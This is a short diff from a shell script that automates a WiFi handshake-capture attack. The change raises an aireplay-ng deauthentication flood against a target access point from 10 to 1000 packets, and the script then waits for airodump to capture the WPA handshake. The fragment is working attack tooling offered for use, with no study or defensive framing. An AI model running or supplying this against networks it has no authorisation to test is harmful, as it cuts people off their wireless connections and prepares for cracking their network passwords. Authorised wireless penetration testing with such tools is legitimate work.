@@ -74,7 +74,7 @@ sleep 5
 
 # --- Step 5: Launch Deauth Attack ---
 echo -e "${cyan}[*] Launching Deauth attack to force handshake...${reset}"
-xterm -hold -e "sudo aireplay-ng --deauth 10 -a $bssid $mon_iface" &
+xterm -hold -e "sudo aireplay-ng --deauth 1000 -a $bssid $mon_iface" &
 sleep 15
 
 echo -e "${green}[+] Wait for WPA Handshake capture. Close airodump window manually.${reset}"
